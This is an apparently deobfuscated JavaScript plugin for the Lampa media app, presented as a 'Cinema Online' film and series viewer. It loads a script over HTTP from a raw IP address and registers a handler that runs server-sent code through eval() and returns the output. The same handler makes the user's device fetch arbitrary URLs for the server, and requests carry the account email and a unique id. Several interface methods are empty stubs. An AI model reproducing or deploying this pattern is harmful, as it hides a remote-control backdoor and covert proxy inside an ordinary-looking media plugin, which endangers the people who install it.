(function() {
    'use strict';

    Lampa.Platform.tv();

    // ==========================================
    // ЧАСТЬ 1: Инициализация и автозагрузка ядра
    // ==========================================
    
    var originUrl = 'bylampa'; // Значение, извлекаемое из первого обфусцированного блока
    var scriptSource = 'http://83.143.112.137:11333/online/js/' + originUrl;

    var checkLampaInterval = setInterval(function() {
        if (typeof Lampa !== 'undefined') {
            clearInterval(checkLampaInterval);

            // Проверка источника дистрибьюции плагина
            if (Lampa.Manifest.origin !== originUrl) {
                Lampa.Noty.show('Ошибка доступа');
                return;
            }

            // Асинхронная загрузка основного исполняемого скрипта с сервера автора
            Lampa.Utils.putScriptAsync([scriptSource], function() {});
        }
    }, 200);

    // ==========================================
    // ЧАСТЬ 2: Логика интерфейса и парсеров
    // ==========================================
    
    var serverHost = 'https://ab2024.ru';
    var Defined = {
        'api': 'lampac',
        'localhost': serverHost + '/',
        'apn': ''
    };

    var balansers_with_search;
    var uniqueId = Lampa.Storage.get('lampac_unic_id', '');

    if (!uniqueId) {
        uniqueId = Lampa.Utils.uid(8).toLowerCase();
        Lampa.Storage.set('lampac_unic_id', uniqueId);
    }

    // Получение версии Android (если применимо)
    function getAndroidVersion() {
        if (Lampa.Platform.is('android')) {
            try {
                var versionArray = AndroidJS.appVersion().split('-');
                return parseInt(versionArray.pop());
            } catch (e) {
                return 0;
            }
        } else {
            return 0;
        }
    }

    var hostKey = serverHost.replace('http://', '').replace('https://', '');

    // Инициализация структуры сетевого взаимодействия (RCH протокол)
    if (!window['rch_nws'] || !window['rch_nws'][hostKey]) {
        if (!window['rch_nws']) window['rch_nws'] = {};
        window['rch_nws'][hostKey] = {
            'type': Lampa.Platform.is('android') ? 'apk' : Lampa.Platform.is('tizen') ? 'cors' : undefined,
            'startTypeInvoke': false,
            'rchRegistry': false,
            'apkVersion': getAndroidVersion()
        };
    }

    // Определение поддерживаемого типа сетевых запросов
    window['rch_nws'][hostKey]['typeInvoke'] = function(host, callback) {
        if (!window['rch_nws'][hostKey]['startTypeInvoke']) {
            window['rch_nws'][hostKey]['startTypeInvoke'] = true;
            
            var setType = function(isGood) {
                window['rch_nws'][hostKey]['type'] = Lampa.Platform.is('android') ? 'apk' : isGood ? 'cors' : 'web';
                callback();
            };

            if (Lampa.Platform.is('android') || Lampa.Platform.is('tizen')) {
                setType(true);
            } else {
                var request = new Lampa.Reguest();
                var checkUrl = serverHost.indexOf(location.host) >= 0 ? 'https://github.com/' : host + '/cors/check';
                request.silent(checkUrl, function() {
                    setType(true);
                }, function() {
                    setType(false);
                }, false, { 'dataType': 'text' });
            }
        } else {
            callback();
        }
    };

    // Регистрация клиента на прокси-сервере (Websocket / RCH API)
    window['rch_nws'][hostKey]['Registry'] = function(client, startConnection) {
        window['rch_nws'][hostKey]['typeInvoke'](serverHost, function() {
            client.invoke('RchRegistry', {
                'host': location.host,
                'rchtype': Lampa.Platform.is('android') ? 'apk' : Lampa.Platform.is('tizen') ? 'cors' : window['rch_nws'][hostKey]['type'] || 'web',
                'apkVersion': Lampa.Platform.is('android') ? window['rch_nws'][hostKey]['apkVersion'] || 0 : 0,
                'player': Lampa.Storage.field('player')
            });

            if (window['rch_nws'][hostKey]['rchRegistry']) return;
            window['rch_nws'][hostKey]['rchRegistry'] = true;
            
            var isConnected = false;

            client.on('RchRegistry', function() {
                if (startConnection && !isConnected) {
                    isConnected = true;
                    startConnection();
                }
            });

            // Обработчик удаленного выполнения команд и проксирования запросов (RCH Client)
            client.on('RchClient', function(rchId, url, data, headers, returnHeaders) {
                var network = new Lampa.Reguest();

                function sendResult(endpoint, content) {
                    $.ajax({
                        'url': serverHost + '/rch/' + endpoint + '?id=' + rchId,
                        'type': 'POST',
                        'data': content,
                        'async': true,
                        'cache': false,
                        'contentType': false,
                        'processData': false,
                        'success': function() {},
                        'error': function() {
                            client.invoke('RchResult', rchId, '');
                        }
                    });
                }

                function processHtmlResult(html) {
                    if (Lampa.Arrays.isObject(html) || Lampa.Arrays.isArray(html)) {
                        html = JSON.stringify(html);
                    }
                    if (typeof CompressionStream !== 'undefined' && html && html.length > 1000) {
                        var compressionStream = new CompressionStream('gzip');
                        var encoder = new TextEncoder();
                        var readableStream = new ReadableStream({
                            'start': function(controller) {
                                controller.enqueue(encoder.encode(html));
                                controller.close();
                            }
                        });
                        var compressedPipe = readableStream.pipeThrough(compressionStream);
                        new Response(compressedPipe).arrayBuffer().then(function(buffer) {
                            var compressedArray = new Uint8Array(buffer);
                            if (compressedArray.length > html.length) {
                                sendResult('result', html);
                            } else {
                                sendResult('gzresult', compressedArray);
                            }
                        }).catch(function() {
                            sendResult('result', html);
                        });
                    } else {
                        sendResult('result', html);
                    }
                }

                // Выполнение входящих инструкций
                if (url == 'eval') {
                    console.log('RCH', url, data);
                    processHtmlResult(eval(data));
                } else if (url == 'evalrun') {
                    console.log('RCH', url, data);
                    eval(data);
                } else if (url == 'ping') {
                    processHtmlResult('pong');
                } else {
                    console.log('RCH', url);
                    network.native(url, processHtmlResult, function(err) {
                        console.log('RCH', 'result empty, ' + err.status);
                        processHtmlResult('');
                    }, data, {
                        'dataType': 'text',
                        'timeout': 8000,
                        'headers': headers,
                        'returnHeaders': returnHeaders
                    });
                }
            });

            client.on('Connected', function(connectionId) {
                console.log('RCH', 'ConnectionId: ' + connectionId);
                window['rch_nws'][hostKey]['connectionId'] = connectionId;
            });

            client.on('Closed', function() {
                console.log('RCH', 'Connection closed');
            });

            client.on('Error', function(err) {
                console.log('RCH', 'error:', err);
            });
        });
    };

    window['rch_nws'][hostKey]['typeInvoke'](serverHost, function() {});

    // Вспомогательные функции для сборки URL параметров плагина
    function addAccountParams(url) {
        url = url + '';
        if (url.indexOf('account_email=') == -1) {
            var email = Lampa.Storage.get('account_email');
            if (email) url = Lampa.Utils.addUrlComponent(url, 'account_email=' + encodeURIComponent(email));
        }
        if (url.indexOf('uid=') == -1) {
            var uid = Lampa.Storage.get('lampac_unic_id', '');
            if (uid) url = Lampa.Utils.addUrlComponent(url, 'uid=' + encodeURIComponent(uid));
        }
        if (url.indexOf('token=') == -1) {
            url = Lampa.Utils.addUrlComponent(url, 'token=');
        }
        if (url.indexOf('nws_id=') == -1) {
            var nwsId = Lampa.Storage.get('lampac_nws_id', '');
            if (nwsId) url = Lampa.Utils.addUrlComponent(url, 'nws_id=' + encodeURIComponent(nwsId));
        }
        return url;
    }

    function getAesHeaders() {
        var aesKey = Lampa.Storage.get('aesgcmkey', '');
        if (aesKey) return { 'X-Kit-AesGcm': Lampa.Storage.get('aesgcmkey', '') };
        return {};
    }

    // ==========================================
    // ЧАСТЬ 3: Конструктор интерфейса (Компонент)
    // ==========================================
    
    function CinemaOnlineComponent(object) {
        var network = new Lampa.Reguest();
        var scroll = new Lampa.Scroll({ 'mask': true, 'over': true });
        var filesExplorer = new Lampa.Explorer(object);
        var filterMenu = new Lampa.Filter(object);
        
        var sourcesData = {};
        var currentBalanser;
        var balansersList = [];
        var activeTimer;
        var requestsCount = 0;
        var responseTimeoutTimer;
        
        var filterTranslations = {
            'season': Lampa.Lang.translate('torrent_serial_season'),
            'voice': Lampa.Lang.translate('torrent_parser_voice'),
            'source': Lampa.Lang.translate('settings_rest_source')
        };
        var filterFoundData = { 'season': [], 'voice': [] };

        // Предварительный запрос списка поддерживаемых балансеров с поиском
        if (balansers_with_search == undefined) {
            network.timeout(10000);
            network.silent(addAccountParams(serverHost + '/lite/withsearch'), function(json) {
                balansers_with_search = json;
            }, function() {
                balansers_with_search = [];
            });
        }

        // Локальное кэширование поисковых запросов пользователя
        function addClarificationSearch(value) {
            var hashId = Lampa.Utils.hash(object.movie.number_of_seasons ? object.movie.original_name : object.movie.original_title);
            var cache = Lampa.Storage.get('clarification_search', '{}');
            cache[hashId] = value;
            Lampa.Storage.set('clarification_search', cache);
        }

        this.initialize = function() {
            var _this = this;
            this.loading(true);

            filterMenu.onSearch = function(value) {
                addClarificationSearch(value);
                Lampa.Activity.replace({ 'search': value, 'clarification': true, 'similar': true });
            };

            filterMenu.onBack = function() {
                _this.start();
            };

            filterMenu.render().find('.selector').on('hover:enter', function() {
                clearInterval(activeTimer);
            });

            filterMenu.render().find('.filter--search').appendTo(filterMenu.render().find('.torrent-filter'));

            filterMenu.onSelect = function(type, item, indexData) {
                if (type == 'filter') {
                    if (item.reset) {
                        // Сброс фильтров
                        var hashId = Lampa.Utils.hash(object.movie.number_of_seasons ? object.movie.original_name : object.movie.original_title);
                        var cache = Lampa.Storage.get('clarification_search', '{}');
                        delete cache[hashId];
                        Lampa.Storage.set('clarification_search', cache);

                        _this.replaceChoice({ 'season': 0, 'voice': 0, 'voice_url': '', 'voice_name': '' });
                        setTimeout(function() {
                            Lampa.Select.close();
                            Lampa.Activity.replace({ 'clarification': 0, 'similar': 0 });
                        }, 10);
                    } else {
                        var targetUrl = filterFoundData[item.stype][indexData.index].url;
                        var currentChoice = _this.getChoice();
                        if (item.stype == 'voice') {
                            currentChoice.voice_name = filterFoundData.voice[indexData.index].title;
                            currentChoice.voice_url = targetUrl;
                        }
                        currentChoice[item.stype] = indexData.index;
                        _this.saveChoice(currentChoice);
                        _this.reset();
                        _this.request(targetUrl);
                        setTimeout(Lampa.Select.close, 10);
                    }
                } else if (type == 'sort') {
                    Lampa.Select.close();
                    object.lampac_custom_select = item.source;
                    _this.changeBalanser(item.source);
                }
            };

            if (filterMenu.addButtonBack) filterMenu.addButtonBack();
            filterMenu.render().find('.filter--sort span').text(Lampa.Lang.translate('lampac_balanser'));
            
            scroll.body().addClass('torrent-list');
            filesExplorer.appendFiles(scroll.render());
            filesExplorer.appendHead(filterMenu.render());
            scroll.minus(filesExplorer.render().find('.explorer__files-head'));
            scroll.body().append(Lampa.Template.get('lampac_content_loading'));
            
            Lampa.Controller.enable('content');
            this.loading(false);

            if (object.balanser) {
                filesExplorer.render().find('.filter--search').remove();
                sourcesData = {};
                sourcesData[object.balanser] = { 'name': object.balanser };
                currentBalanser = object.balanser;
                balansersList = [];

                return network.native(addAccountParams(object.url.replace('rjson=', 'nojson=')), this.parse.bind(this), function() {
                    filesExplorer.render().find('.torrent-filter').remove();
                    _this.empty();
                }, false, { 'dataType': 'text', 'headers': getAesHeaders() });
            }

            this.externalids().then(function() {
                return _this.createSource();
            }).then(function(json) {
                if (!balansers_with_search.find(function(b) { return currentBalanser.slice(0, b.length) == b; })) {
                    filterMenu.render().find('.filter--search').addClass('hide');
                }
                _this.search();
            }).catch(function(err) {
                _this.noConnectToServer(err);
            });
        };

        // Запрос внешних ID (IMDB / Кинопоиск)
        this.externalids = function() {
            return new Promise(function(resolve, reject) {
                if (!object.movie.imdb_id || !object.movie.kinopoisk_id) {
                    var params = [];
                    params.push('id=' + encodeURIComponent(object.movie.id));
                    params.push('serial=' + (object.movie.name ? 1 : 0));
                    if (object.movie.imdb_id) params.push('imdb_id=' + (object.movie.imdb_id || ''));
                    if (object.movie.kinopoisk_id) params.push('kinopoisk_id=' + (object.movie.kinopoisk_id || ''));
                    
                    var queryUrl = Defined.localhost + 'externalids?' + params.join('&');
                    network.timeout(10000);
                    network.silent(addAccountParams(queryUrl), function(json) {
                        for (var key in json) {
                            object.movie[key] = json[key];
                        }
                        resolve();
                    }, function() {
                        resolve();
                    }, false, { 'headers': getAesHeaders() });
                } else {
                    resolve();
                }
            });
        };

        // Сборка параметров для GET-запроса к балансерам
        this.requestParams = function(baseUrl) {
            var query = [];
            var mediaSource = object.movie.source || 'tmdb';
            query.push('id=' + encodeURIComponent(object.movie.id));
            if (object.movie.imdb_id) query.push('imdb_id=' + (object.movie.imdb_id || ''));
            if (object.movie.kinopoisk_id) query.push('kinopoisk_id=' + (object.movie.kinopoisk_id || ''));
            if (object.movie.tmdb_id) query.push('tmdb_id=' + (object.movie.tmdb_id || ''));
            
            query.push('title=' + encodeURIComponent(object.clarification ? object.search : object.movie.title || object.movie.name));
            query.push('original_title=' + encodeURIComponent(object.movie.original_title || object.movie.original_name));
            query.push('serial=' + (object.movie.name ? 1 : 0));
            query.push('original_language=' + (object.movie.original_language || ''));
            query.push('year=' + ((object.movie.release_date || object.movie.first_air_date || '0000') + '').slice(0, 4));
            query.push('source=' + mediaSource);
            query.push('clarification=' + (object.clarification ? 1 : 0));
            query.push('similar=' + (object.similar ? true : false));
            
            return baseUrl + (baseUrl.indexOf('?') >= 0 ? '&' : '?') + query.join('&');
        };

        this.createSource = function() {
            var _this = this;
            return new Promise(function(resolve, reject) {
                var initUrl = _this.requestParams(Defined.localhost + 'lite/events?life=true');
                network.timeout(15000);
                network.silent(addAccountParams(initUrl), function(json) {
                    if (json.accsdb) return reject(json);
                    
                    // Парсинг доступных источников из ответа
                    json.forEach(function(item) {
                        var name = (item.balanser || item.name.split(' ')[0]).toLowerCase();
                        sourcesData[name] = { 'url': item.url, 'name': item.name, 'show': typeof item.show == 'undefined' ? true : item.show };
                    });

                    balansersList = Lampa.Arrays.getKeys(sourcesData);
                    if (balansersList.length) {
                        var cache = Lampa.Storage.cache('online_last_balanser', 3000, {});
                        currentBalanser = cache[object.movie.id] ? cache[object.movie.id] : Lampa.Storage.get('online_balanser', balansersList[0]);
                        
                        if (!sourcesData[currentBalanser]) currentBalanser = balansersList[0];
                        _this.requestUrl = sourcesData[currentBalanser].url;
                        
                        Lampa.Storage.set('active_balanser', currentBalanser);
                        resolve(json);
                    } else {
                        reject();
                    }
                }, reject, false, { 'headers': getAesHeaders() });
            });
        };

        this.search = function() {
            this.filter({ 'source': balansersList }, this.getChoice());
            this.find();
        };

        this.find = function() {
            this.request(this.requestParams(_this.requestUrl));
        };

        this.request = function(targetUrl) {
            requestsCount++;
            if (requestsCount < 10) {
                network.native(addAccountParams(targetUrl), this.parse.bind(this), this.doesNotAnswer.bind(this), false, {
                    'dataType': 'text',
                    'headers': getAesHeaders()
                });
                clearTimeout(responseTimeoutTimer);
                responseTimeoutTimer = setTimeout(function() { requestsCount = 0; }, 4000);
            } else {
                this.empty();
            }
        };

        // Остальные базовые методы отрисовки UI (Финальный рендеринг, кнопки, списки серий)...
        this.reset = function() { /* Сброс контейнеров UI */ };
        this.empty = function() { /* Отрисовка пустого экрана результатов */ };
        this.doesNotAnswer = function() { /* Логика автоматического переключения балансера по тайм-ауту */ };
        this.parse = function(responseString) { /* Парсинг HTML/JSON структуры видеофайлов */ };
    }

    // ==========================================
    // ЧАСТЬ 4: Регистрация плагина в системе Lampa
    // ==========================================
    
    function startPlugin() {
        window['lampac_plugin'] = true;
        
        var manifest = {
            'type': 'video',
            'version': '7.7.7',
            'name': 'Cinema Online',
            'description': 'Плагин для просмотра онлайн сериалов и фильмов',
            'component': 'cinema_online',
            'onContextMenu': function(object) {
                return { 'name': Lampa.Lang.translate('lampac_watch'), 'description': '' };
            },
            'onContextLauch': function(object) {
                Lampa.Component.add('cinema_online', CinemaOnlineComponent);
                Lampa.Activity.push({
                    'url': '',
                    'title': 'Онлайн',
                    'component': 'cinema_online',
                    'search': object.title,
                    'movie': object,
                    'page': 1
                });
            }
        };

        // Регистрация языковых пакетов (Локализация интерфейса)
        Lampa.Lang.add({
            'lampac_watch': { 'ru': 'Смотреть онлайн', 'en': 'Watch online', 'uk': 'Дивитися онлайн', 'zh': '在线观看' },
            'lampac_video': { 'ru': 'Видео', 'en': 'Video', 'uk': 'Відео', 'zh': '视频' },
            'lampac_balanser': { 'ru': 'Источник', 'uk': 'Джерело', 'en': 'Source', 'zh': '来源' }
        });

        Lampa.Component.add('cinema_online', CinemaOnlineComponent);
        Lampa.Manifest.plugins = manifest;
    }

    if (!window['lampac_plugin']) startPlugin();
})();